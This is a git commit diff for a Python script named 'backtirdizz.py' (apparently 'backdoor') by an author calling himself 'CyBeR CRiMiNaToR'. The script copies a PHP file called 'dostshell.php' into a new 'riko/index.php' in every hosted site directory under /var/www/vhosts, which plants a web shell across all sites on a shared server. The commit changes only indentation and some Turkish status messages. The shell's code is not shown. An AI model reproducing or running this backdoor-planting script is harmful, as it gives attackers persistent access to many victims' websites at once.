6458aefb95f4d6670080fae9329a2d51aadb0fc5
CyBeR CRiMiNaToR <52202656+cybercriminator@users.noreply.github.com>
2024-11-23 03:48:46 +0400

    Update and rename backtirdiz.py to backtirdizz.py

--- backtirdizz.py
+++ backtirdizz.py
@@ -6,19 +6,15 @@ source_file = '/var/www/vhosts/dostshell.php'
 
 for target_dir in glob.glob('/var/www/vhosts/*/httpdocs/'):
     try:
-
-              new_folder = os.path.join(target_dir, 'riko')
+        new_folder = os.path.join(target_dir, 'riko')
         
-
-          os.makedirs(new_folder, exist_ok=True)
+        os.makedirs(new_folder, exist_ok=True)
         
-
         new_file_path = os.path.join(new_folder, 'index.php')
         
-
         shutil.copy(source_file, new_file_path)
         
-        print(f"{source_file}, {new_file_path} olarak kopyalandi.")
+        print(f"{source_file}, {new_file_path} olarak kopyaland.")
     
     except Exception as e:
-        print(f"Hata: {target_dir} icinde dosya olusturulamadı. {e}")
+        print(f"Hata: {target_dir} iinde dosya oluturulamad. {e}")
